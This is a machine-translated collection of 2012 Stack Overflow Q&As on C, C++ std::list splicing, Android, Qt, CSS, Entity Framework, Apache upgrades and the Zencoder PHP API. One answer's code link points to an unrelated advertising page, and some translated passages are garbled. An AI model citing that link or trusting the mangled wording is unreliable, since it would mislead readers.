    int poss_factor;  

    for (poss_factor = 2; poss_factor <= poss_prime/2; poss_factor++) {  
        if (poss_prime % poss_factor == 0) {  
            return 0;  
        }  
    }  

    return 1;

} 
```

我不明白为什么函数可以作为if语句中的条件，以及为什么poss_prime在for循环条件中被二除。谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T20:53:02.690

该函数`prime()`的返回类型为整数。将函数调用放在 if 语句中相当于

```
int value = prime(possprime);
if(value) 
```

如果您随后不需要该返回值，这只是一种更简洁的方式。C 中的逻辑表达式也接受数字参数。0 为假，任何正整数为真。我不知道负整数的结果。

但是，如果您使用 bool 作为素数的返回类型，会更清楚地表明这是一个真/假的情况。

至于素数生成器本身：它正在检查该数字的所有因素。它不能有任何因子大于原始值的一半（不包括它自己），这就是为什么 for 循环只达到可能素数的一半。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:38:07.833

基础编程。

该函数`prime`返回 1 或 0，具体取决于它找到的内容。在 C 中，0 表示“假”，1 表示“真”。

再除以 2，如果这个数有任何因数，它必须是这个数的一半或更少，因为最小的可能因数是 2。

# android - 位图 + 画布密度依赖

> ID：10676969
> 
> 赞同：3
> 
> 时间：2012-05-20T20:34:10.190
> 
> 标签：android

我只是不知道如何在位图上绘制（在画布的帮助下），这样结果就不会依赖于设备密度。

这是制作绘图的代码：

```
ImageView iv = (ImageView)findViewById(R.id.container);
Bitmap result = BitmapFactory.decodeResource(getResources(), R.drawable.big_picture).copy(Bitmap.Config.ARGB_8888, true);
Canvas canvas = new Canvas(result);
canvas.drawBitmap(BitmapFactory.decodeResource(getResources(), R.drawable.small_picture), actualX, actualY, null);
iv.setImageBitmap(result); 
```

我在其中加载了一个 big_picture，`Bitmap result`我想在其上绘制一个 small_picture，但在指定位置。如果我设置actualX 和actualY，那么在具有相同密度的设备上就可以了。然而，具有不同密度的设备会“缩放”画布。

有趣的是，只有 small_picture 被“缩放”并离开屏幕，但它后面的 pig_picture 恰好适合任何密度屏幕上的屏幕。这是为什么？如何在 big_picture 密度上独立绘制 small_picture？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T22:34:34.673

我在调试`Bitmap`. 除非您将图像放入图像中，否则`drawable-nodpi`图像将重新调整大小以匹配标称设备密度。（分别是 120、160、240、320）如果您将图像“加载”到 a`Bitmap`并且`Canvas`无论原始图像如何，它们都将具有这些密度之一。

所以一种解决方案是将图像放到`drawable-nodpi`. 之后，它们在所有密度上的行为都相同。

另一种解决方案是根据上述密度的比率乘以坐标。

...或者您可以为所有限定符制作自定义图像和坐标。

# c++ - cpp 在 std::list 的这个位置之后移动位置之前的一些元素

> ID：10676978
> 
> 赞同：2
> 
> 时间：2012-05-20T20:34:55.220
> 
> 标签：c++, list, std, splice

我有`std::list`例如。带整数：`9 10 8 25 70 75 30 14 80`

我想在元素`10`之后移动所有元素，`some_position_number`例如。`= 5`. 移动对象的初始顺序很重要，必须与移动后的初始顺序相同。

换句话说，最后需要接收它们之后的`some_position_number`元素`false``true`

就像第一个例子一样：10 25 70 75 30 **9** * *8* * 14 80

第二个首字母：`9 3 8 25 70 75 30 14 80` 第二个结果：10 25 70 75 30 **9** * *3* * **8** 14 80

第三个首字母：`25 70 75 30 14 9 3 8 80` 第三个结果：（`25 70 75 30 14 9 3 8 80`开头已经是5）

4 初始：`3 4 1 2 3 9 3 8 80` 4 结果：（`9 3 8 80 3 4 1 2 3`类似这样）似乎`some_position_number`必须将这里用作阈值或`80 3 4 1 2 3 9 3 8`也接受，但似乎需要检查 end() 和无限循环？

如何做到这一点最有效的方式，也许没有额外`list`的以避免不必要的对象创建和擦除？`std::list`因为在真正的应用程序中， , 但对象没有整数。也许 std::splice？以某种方式选择需要移动的对象，而不是找到新位置并将每个元素 std::splice 到它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T21:44:25.030

[它很丑，但它有效](http://www.greatvwads.com/pix/ad24.htm)，我相信它可以正确处理所有迭代器失效情况：

```
#include <iostream>
#include <list>

using namespace std;

list<int> l;

// prototypes for various helpers of no consequence to the question
void  init();
bool my_pred( list<int>::value_type val);
void dump_list( list<int> const& l);

typedef list<int>::iterator iter_t;

int main() 
{
    init();
    dump_list(l);

    // we want to remove elements that meet the predicate until
    // there are `some_position_number` elements that didn't meet 
    // the predicate

    int some_position_number = 5;
    list<int> tmp_list;

    iter_t i = l.begin();
    for (int count = 0; count < some_position_number && i != l.end(); ) {
        iter_t tmp(i);
        ++i;
        if (my_pred(*tmp)) {
            tmp_list.splice( tmp_list.end(), l, tmp); // remove an element
        }
        else {
            ++count;
        }
    }

    // now i points at the position we want to insert the elements we removed:

    l.splice( i, tmp_list);

    dump_list(l);
}

bool my_pred( list<int>::value_type val)
{
    return val < 10;
}

void  init()
{
    l.push_back(9);
    l.push_back(10);
    l.push_back(8);
    l.push_back(25);
    l.push_back(70);
    l.push_back(75);
    l.push_back(30);
    l.push_back(14);
    l.push_back(80);
}

void dump_list( list<int> const& l)
{
    for (list<int>::const_iterator i = l.begin(); i != l.end(); ++i) {
        cout << *i << " ";
    }

    cout << endl;
} 
```

关键是：

*   `i`用于遍历可能移动的元素范围的迭代器必须在调用`splice()`. 当`splice()`被调用时，原来的`i`（现在`tmp`）无效。
*   我们将要移动的元素拼接到一个临时列表中。虽然这需要第二个列表，但它仍然不涉及元素的副本——我们只是将它们移动到其他地方以方便记账。
*   保留不满足谓词的元素的计数 - 这让我们在移动时找出插入点，检查要移动的元素。

# git - 转换后将 SVN 作者文件添加到 git repo 并使用 git-svn 提交

> ID：10676982
> 
> 赞同：1
> 
> 时间：2012-05-20T20:35:23.523
> 
> 标签：git, git-svn

我最近切换到使用 git 并按照[这些说明](http://help.github.com/import-from-subversion/%20%22these%20instructions)转换我的 SVN 存储库。但是，我没有按照说明制作作者文件，并且我已经提交了转换后的存储库并一直在处理它，并添加了进一步的提交。

我的旧 SVN 存储库现在已经过时了，但我现在想让作者姓名匹配，我已经创建了作者文件。如何在不弄乱我最近的提交历史的情况下这样做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:57:39.860

如果你想重写你的本地 git 历史，你可以试试[这个](https://stackoverflow.com/questions/392332/retroactively-correct-authors-with-git-svn)，也许你可以改变它来从你的作者文件而不是脚本中获取作者。

# apache - 将本机 apache 从 2.2.21 升级到 2.4.2 - Lion 10.7.4

> ID：10676983
> 
> 赞同：3
> 
> 时间：2012-05-20T20:35:26.713
> 
> 标签：apache, osx-lion, upgrade, lamp

如标题所述，我将 apache 2.2.21 作为我的 LAMP 堆栈的一部分本地运行。我想将 apache 升级到最新版本 - 2.4.2。是否有推荐或最佳实践来安全地执行此操作而不会破坏丢失现有设置等内容？

感谢您的时间和指导。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-01T22:06:03.450

我能够使用以下步骤安装最新版本（2.4.2）。

使用 fink（或者你使用的任何 osx 包管理器）安装 pcre（perl 兼容的正则表达式库）

```
$ fink install pcre 
```

使用以下步骤安装最新版本（撰写本文时为 2.4.2）

```
$ sudp apachectl stop
$ cd ~/Downloads/
$ curl -O http://mirror.uoregon.edu/apache//httpd/httpd-2.4.2.tar.gz
$ gzip -d httpd-2.4.2.tar.gz
$ tar xvf httpd-2.4.2.tar
$ cd httpd-2.4.2
$ ./configure
$ make
$ sudo make install 
```

但是，新的二进制文件安装在 /usr/local 下，并且似乎没有覆盖 OSX lion 上的默认安装位置。而且我找不到 config.nice 文件按照 apache 升级文档的建议使用。

原始的 apache 文件 httpd、apachectl 和 ab 位于 /usr/sbin。在没有找到任何文档来确认这是正确的做法的情况下，我继续备份了原始文件并将新文件从 /usr/local/bin 符号链接到 /usr/sbin，如下所示。

```
$ cd /usr/sbin

# backup the original files ...

$ sudo ln -s ../local/bin/ab ab
$ sudo ln -s ../local/bin/apachectl apachectl
$ sudo ln -s ../local/bin/httpd httpd 
```

这似乎奏效了，尽管从知情人士那里得到确认会很好。

# c++ - Qt.Signals&Slots.ConnectingProblem

> ID：10676984
> 
> 赞同：0
> 
> 时间：2012-05-20T20:35:31.930
> 
> 标签：c++, qt, signals-slots

我在使用 Qt 的“信号和槽”机制时遇到了一些问题。我有类似的东西（注意：这只是一个简单的例子）：

```
class A : public QGLWidget
{
Q_OBJECT

private: 
int *m_ptr;

public slots:
void addPtr(int *ptr){m_ptr=ptr;}                ///Breakpoint here
};

class B: public QWidget
{
Q_OBJECT

private:
A* m_AclassObject;

public:
B()
{
m_AclassObject=new A();
this->connect(this,SIGNAL(emitAddPtr(int *ptr)),
              m_AclassObject,SLOT(m_AclassObject->addPtr(int *ptr)));
}
void addPtr(int *p)
{
emit emitAddPtr(p);
}
signals:
void emitAddPtr(int *p)
}; 
```

我正在使用 Qt v.4.8.0 和 Visual Studio 2010。代码编译时没有任何错误，运行时也没有问题，但似乎是因为它不起作用:)。我的问题如下：在调试中我无法使用类似的东西进入 A 类插槽：

```
int k=2;
int *p=&k;
B B_obj;
B_obj.addPtr(p); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T20:44:21.903

我认为问题出在将信号连接到插槽时。试试这个：

```
this->connect(this,SIGNAL(emitAddPtr(int *)),
          m_AclassObject,SLOT(addPtr(int *))); 
```

另外，我真的不建议在这种特殊情况下使用信号/插槽，因为不需要它们。仅在函数`A::addPtr()`内部调用会更有意义。`B::addPtr()`当然，如果您的示例只是一个人为的示例，那么请忽略此建议。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:46:34.810

这段代码是错误的：

```
this->connect(this,SIGNAL(emitAddPtr(int *ptr)),
          m_AclassObject,SLOT(m_AclassObject->addPtr(int *ptr))); 
```

你想要这样的东西：

```
this->connect(this,SIGNAL(emitAddPtr(int *ptr)),
          m_AclassObject,SLOT(addPtr(int *ptr))); 
```

# css - 如何排列多行/多列表单？

> ID：10676988
> 
> 赞同：1
> 
> 时间：2012-05-20T20:35:40.097
> 
> 标签：css

我希望能够在列中正确排列标签，以便始终排列不同长度/类型的输入字段。标签始终格式化为相同的长度。

此外，如果需要，我可以省略列中的行。我通过`&nbsp;`在 cols div 中有一个来实现这一点。

我所做的工作；然而，它“感觉”就像是一种软糖，我认为应该有更好的方法来实现这一点。

干杯。

```
<div id="divAddInputFields">
    <fieldset id="fsAddInputFields" class="inputFieldSet">
        <div id="divFsAddCol1">
            <div id="divFsAddCol1Row1">
                <label id="lblGenCode" for="wsGenCode">Gen Code</label><input type="text" class="String02" name="wsGenCode" id="wsGenCode" />
            </div>
            <div id="divFsAddCol1Row2">
                <label id="lblRelNote" for="wsRelNote">Rel Note</label><input type="text" class="String12" name="wsRelNote" id="wsRelNote" />
            </div>
            <div id="divFsAddCol1Row3">
                <label id="lblQuantity" for="wsQuantity">Quantity</label><input type="text" class="Number7_0" name="wsQuantity" id="wsQuantity" />
            </div>
        </div>
            <div id="divFsAddCol1Row1">
                &nbsp;
            </div>
        <div id="divFsAddCol2">
            <div id="divFsAddCol2Row1">
                <label id="lblCofC" for="wsCofC">C of C</label><input type="text" class="String12" name="wsCofC" id="wsCofC" />
            </div>
            <div id="divFsAddCol2Row2">
                <label id="lblComp" for="wsComp">Comp</label><input type="checkbox" class="checkbox1" name="wsComp" id="wsComp" />
            </div>
        </div>
    </fieldset>
</div> 
```

页面特定的 css（在外部文件中.....）。

```
#divAddInputFields  {width:460px;       margin:0px 0px 0px 0px; height:160px; overflow:auto;    float:left; }
#divFsAddCol1       {width:220px;       margin:0px 0px 0px 0px; height:140px; overflow:auto;    float:left; }
#divFsAddCol2       {width:220px;       margin:0px 0px 0px 0px; height:140px; overflow:auto;    float:left; } 
```

来自图书馆的 CSS

```
.inputFieldSet 
{   padding:0px 0px 0px 0px;    
    border:none;}

.label, .inputFieldSet label {
    height:15px;
    width:80px; 
    display: inline-block;
    border:1px solid black; 
    padding:1px 2px 1px 2px;    
    background-color:#66cdaa;   
    vertical-align:top; 
    text-align:left;
    margin:0px 1px 1px 3px;
    font-size:10px;
}

.inputFieldSet input {
    height:15px;
    padding:1px 2px 1px 2px;    
    border:1px solid grey;  
    vertical-align:top;
    position: relative;
    /*overflow: hidden;*/
    margin:0px 0px 1px 0px;
}

.inputFieldSet input[type="submit"] {
    padding:1px 2px 1px 2px;    
    vertical-align:top;
    height:20px;
    position: relative;
    /*overflow: hidden;*/
    margin:0px 0px 1px 0px;
}

.inputFieldSet input[type="checkbox"]  {
    padding:1px 2px 1px 2px;    
    vertical-align: top;
    margin: 0px 0px 0px 0px;
}

.inputFieldSet select {
    padding:1px 0px 1px 2px;    
    vertical-align: top;
    position: relative;
    /*overflow: hidden;*/
    margin:0px 0px 1px 0px;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T21:02:16.597

如果可以的话，我会使用`<table>`这个。

表格旨在显示这样的表格数据。

他们（正确地）因为被用于 HTML 设计布局而受到了不好的评价。

但是对于像这样的表格数据，我会使用一个。
您显然可以更轻松地处理对齐问题。

# c# - 为什么当我离开页面时我的数据库会崩溃？

> ID：10676989
> 
> 赞同：0
> 
> 时间：2012-05-20T20:35:45.637
> 
> 标签：c#, .net, asp.net-mvc-3, sql-server-ce

每当我导航到特定页面然后离开它时，都会删除一些表。此页面与其余页面之间唯一不同的是此页面使用不同的`DbContext`. 被删除的表格也是不同的一部分，`DbContext`在访问的页面上没有使用。这真的让我着迷，有什么建议吗？

使页面崩溃的控制器是。

```
public class GenerationController : Controller
{
    private GenerationDbContext GenerationDb = new GenerationDbContext();
    private string generatedDir = "~/App_Data/Generated";

    //
    // GET: /Generation/

    public ViewResult Index()
    {
        var viewModel = new GenerationIndexViewModel
        {
            Generations = GenerationDb.Generations
                .OrderByDescending(g => g.GeneratedOn)
                .ToList()
        };

        return View(viewModel);
    }

    protected override void Dispose(bool disposing)
    {
        GenerationDb.Dispose();
        base.Dispose(disposing);
    }
} 
```

**更新：** 我刚刚意识到我有另一个页面可以访问这两个`DbContext`s。出于某种原因，我可以导航到此页面，然后离开而不删除表。只是这一页删除了其他上下文的所有表。

**更新：** 当我将`Index`动作更改为。

```
public ActionResult Index()
{
    return Content("Hello.");
} 
```

我可以在页面和所有其他页面之间导航。没有关于表被删除的错误。因此，我很肯定它必须与模型或数据库上下文有关。哪个是这样。

```
public class Generation
{
    public int Id { get; set; }

    [Required]
    public DateTime GeneratedOn { get; set; }

    [Required, StringLength(4000)]
    public string Name { get; set; }
}

public class GenerationDbContext : DbContext
{
    public DbSet<Generation> Generations { get; set; }
} 
```

**更新：** 使用随 VWD 提供的数据库资源管理器，`Generations`当我导航到该页面时，会出现该表。当我导航到另一个使用不同数据库上下文的页面时，该`Generations`表仍然是唯一的表。啊！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T01:06:01.513

听起来你有 Code First；每个 dbcontext 第一次运行时，它会检查它配置为连接到的数据库。如果模式不是它期望找到的，它会展平数据库并根据该上下文使用的模型类重新创建表。

有很多方法可以解决这个问题。最简单的方法是将您的上下文组合起来，或者将每个上下文指向其自己的单独数据库。

# java - 访问常用功能静态？

> ID：10676992
> 
> 赞同：4
> 
> 时间：2012-05-20T20:36:23.520
> 
> 标签：java, android

我有一个可能更笼统的问题，但我在 android dev 期间遇到了它：

我怎样才能最好地分享自己常用的方法？例如，通过键检索共享首选项始终是相同的代码。但是如果我必须在不同的片段或活动中使用它，我总是必须复制相同的代码：

```
private void setSharedPrefs(String key, String value) {
    SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(context);
    SharedPreferences.Editor editor = settings.edit();
    editor.putString(key, value).commit();
} 
```

`public static`在 GlobalUtils 类中使用它是一个好习惯吗？您将如何处理这些功能？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T20:47:57.353

您绝对可以创建一个静态类，例如 GlobalUtils，甚至可以为`SharedPreferences`. 您只需将 a 传递`Context`给该方法，以便您可以获取该`SharedPreferences`对象。你可以把它带到你需要的地方；我已经无数次上了这些课。我什至有一个线程安全的`SharedPreferences`包装器:-)

**编辑：**再次查看我的代码，我的一半`SharedPreference`包装器是静态的，其余的是懒惰地实例化。话虽如此，我认为只要您的其余代码不需要以一种或另一种方式进行，您就应该做任何您觉得舒服的事情。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T20:51:20.193

是的，您可以将其设为公开静态：

```
public static void setSharedPrefs(Context context, String key, String value) {
    SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(context);
    SharedPreferences.Editor editor = settings.edit();
    editor.putString(key, value).commit();
} 
```

在某些情况下要小心，在活动结束后您可能会保留上下文，这很糟糕。

您描述的更可能的情况是创建这样的类：

```
public class MyPrefs {

     SharedPreferences settings;
     SharedPreferences.Editor editor;

     public MyPrefs(Context context){
        settings = PreferenceManager.getDefaultSharedPreferences(context);
        editor = settings.edit();
     }

     public void saveName(String name){
          editor.putString("name", name).commit();
     } 

} 
```

您将在扩展 Application 的类中延迟初始化此类，并在其中有一个 getter 来检索它，例如：

```
 MyPrefs prefs = ((MyAppication) getContext().getApplicationContext()).getMyPrefs(); 
```

并像这样使用它：

```
 prefs.saveName("blundell"); 
```

*编辑*

惰性初始化示例：

```
private MyPrefs prefs;

public MyPrefs getMyPrefs(){
     if(prefs == null){
          prefs = new MyPrefs(this);
     }
     return prefs;
} 
```

**注意**这是一个类中的延迟初始化，`Application`因此扩展`this`是指您的应用程序上下文，并将在您的应用程序的持续时间内存在。如果您在哪里使用 Activity 上下文，您将不想使用延迟初始化。（**所以使用应用程序上下文！**）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-20T20:50:45.433

我通常在不同类的静态方法中编写通用代码。这样我就可以在项目的任何地方调用静态方法，而无需每次都创建新的类对象。

# php - Zencoder API PHP 缩略图

> ID：10676995
> 
> 赞同：2
> 
> 时间：2012-05-20T20:36:43.497
> 
> 标签：php, api, thumbnails, zencoder

我正在使用 Zencoder API PHP 库 (https://github.com/zencoder/zencoder-php/blob/master/README.md) 并且可以成功提交单个作业进行转换。但是，我正在努力使缩略图的格式正确。

Zencoder 所需的 JSON 是：

```
"output": [
{
  "thumbnails": {
    "width": 800,
    "height": 600
  }
},
{
  "video_codec": "wmv"
}
] 
```

因此，当我通过 PHP API 提交以下内容时，我可以让视频正常工作，但无法确定缩略图元素的正确格式：

```
"outputs" => array(
array(                                                                                                        
"video_codec"=> "wmv"
)
) 
```

我怀疑我错过了一些简单的东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-17T20:45:33.213

您的第一个示例将创建两个输出 - 一个用于视频，一个用于缩略图。您可以在一个输出中完成所有这些操作并为自己节省一些钱。

```
"outputs": [
  {
    "thumbnails": {
      "width": 800,
      "height": 600
    },
    "video_codec": "wmv"
  }
] 
```

你可以为你的 PHP 请求做同样的事情：

```
"outputs" => array(
  array(                                                                                                        
    "video_codec"=> "wmv"
    "thumbnails" => array(
      "width" => 800,
      "height" => 600
    )
  )
) 
```

希望有帮助。

# c - 字符串化操作符

> ID：10676999
> 
> 赞同：0
> 
> 时间：2012-05-20T20:37:41.477
> 
> 标签：c, macros

以下代码如何正确编译，

```
#include <stdio.h>
#define stringer( x ) printf_s( #x "\n" )
int main() {
stringer( "In quotes when printed to the screen" );   
} 
```

它不应该扩展到

```
printf_s(""In quotes when printed to the screen""\n"); 
```

这是一个错误，因为 printf_s 中有嵌套的双引号？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T20:44:41.977

不，`#`运算符专门处理字符串文字。它必须在传递给它的字符串文字中`\`转义每个。`"`正确的展开是：

```
printf_s( "\"In quotes when printed to the screen\"" "\n" ); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-20T20:43:42.067

不，它已扩展为

```
printf_s("\"In quotes when printed to the screen\"" "\n"); 
```

最终将是

```
printf_s("\"In quotes when printed to the screen\"\n"); 
```

并且应该打印

```
"In quotes when printed to the screen" 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-20T20:45:13.880

在 C 中，相邻的字符串文字[被连接起来](http://en.wikipedia.org/wiki/C_syntax#String_literal_concatenation)：

> 相邻的字符串文字在编译时连接；这允许将长字符串拆分为多行，并且还允许在编译时将由 C 预处理器定义和宏生成的字符串文字附加到字符串：